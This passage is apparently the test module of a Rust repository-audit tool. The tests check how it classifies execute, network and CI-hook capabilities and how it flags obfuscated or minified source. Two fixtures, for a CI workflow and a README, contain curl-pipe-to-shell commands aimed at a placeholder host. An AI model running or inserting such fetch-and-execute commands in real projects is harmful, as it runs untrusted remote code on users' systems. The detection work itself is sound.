        assert!(has_token("run: sh -c 'x'", "sh"));
    }

    #[test]
    fn python_import_is_weak_capability_evidence() {
        let sum = summary(
            "setup.py",
            "python",
            vec![("import", 3, "import subprocess")],
        );
        let mut entries = Vec::new();
        classify(&sum, &mut entries);
        let weak = entries
            .iter()
            .filter(|entry| entry.capability == "execute")
            .all(|entry| entry.confidence == "weak" && entry.evidence == "capability-import");
        assert!(weak, "{entries:?}");
        assert!(
            entries
                .iter()
                .any(|entry| entry.capability == "execute" && entry.line == Some(3))
        );
    }

    #[test]
    fn workflow_run_and_uses_are_entry_points() {
        let sum = summary(
            ".github/workflows/ci.yml",
            "yaml",
            vec![
                (
                    "signature",
                    4,
                    "run: bash -c \"curl https://x.invalid | sh\"",
                ),
                ("signature", 6, "uses: actions/checkout@v4"),
            ],
        );
        let mut entries = Vec::new();
        classify(&sum, &mut entries);
        let found = caps(&entries);
        assert!(
            found.contains(&("hook", "ci-run", "ci-run-step")),
            "{found:?}"
        );
        assert!(
            found.contains(&("hook", "ci-uses", "ci-action")),
            "{found:?}"
        );
        assert!(
            found.contains(&("network", "ci-run", "remote-fetch")),
            "{found:?}"
        );
    }

    #[test]
    fn docs_commands_are_marked_as_docs_scope() {
        let sum = summary(
            "README.md",
            LANG_MARKDOWN,
            vec![("call", 9, "curl -fsSL https://x.invalid/i.sh | sh")],
        );
        let mut entries = Vec::new();
        classify(&sum, &mut entries);
        assert!(
            entries.iter().all(|entry| entry.scope == "docs"),
            "{entries:?}"
        );
        assert!(entries.iter().any(|entry| entry.trigger == "doc"));
    }

    #[test]
    fn build_script_presence_is_a_hook() {
        let sum = summary(
            "build.rs",
            "rust",
            vec![("call", 2, "Command::new(\"cc\")")],
        );
        let mut entries = Vec::new();
        classify(&sum, &mut entries);
        assert!(caps(&entries).contains(&("hook", "build-script", "build-script-present")));
    }

    #[test]
    fn artifacts_are_reported_with_their_reason() {
        let artifact = report::SuspiciousArtifact {
            path: "bin/tool.dylib".to_string(),
            size_bytes: 42,
            reason: "binary_or_archive_extension".to_string(),
        };
        let mut entries = Vec::new();
        push_artifact(&mut entries, "bin/tool.dylib", &artifact);
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].capability, "artifact");
        assert_eq!(entries[0].evidence, "binary_or_archive_extension");
    }

    #[test]
    fn unknown_artifact_reason_is_generic() {
        assert_eq!(artifact_evidence("something_new"), "suspicious_artifact");
    }

    #[test]
    fn obfuscated_source_is_reported_as_an_artifact() {
        let mut blob = String::from("var _0x1a2b=[");
        for i in 0..200 {
            blob.push_str(&format!("'_0x{i:04x}',"));
        }
        blob.push_str("];");
        let mut entries = Vec::new();
        audit_shape("src/index.js", blob.as_bytes(), &mut entries);
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].capability, "artifact");
        assert_eq!(entries[0].evidence, "obfuscated_source");
        assert_eq!(entries[0].confidence, "strong");
        assert!(
            entries[0].text.contains("generated_idents="),
            "{}",
            entries[0].text
        );
    }

    #[test]
    fn long_generated_line_is_weak_minified_source() {
        let line = "a".repeat(20_001);
        let mut entries = Vec::new();
        audit_shape("dist/bundle.js", line.as_bytes(), &mut entries);
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].evidence, "minified_source");
        assert_eq!(entries[0].confidence, "weak");
    }

    #[test]
    fn ordinary_source_and_lockfiles_are_not_shape_flagged() {
        let mut entries = Vec::new();
        audit_shape(
            "src/main.rs",
            b"fn main() { println!(\"hi\"); }\n",
            &mut entries,
        );
        assert!(entries.is_empty());
        let lock = "_0x".repeat(200);
        audit_shape("package-lock.json", lock.as_bytes(), &mut entries);
        assert!(entries.is_empty(), "{entries:?}");
    }

    #[test]
    fn capability_order_is_stable() {
        assert_eq!(
            CAPABILITIES,
            [
                "artifact", "deps", "execute", "fs-write", "hook", "network", "secret"
            ]
        );
    }
}
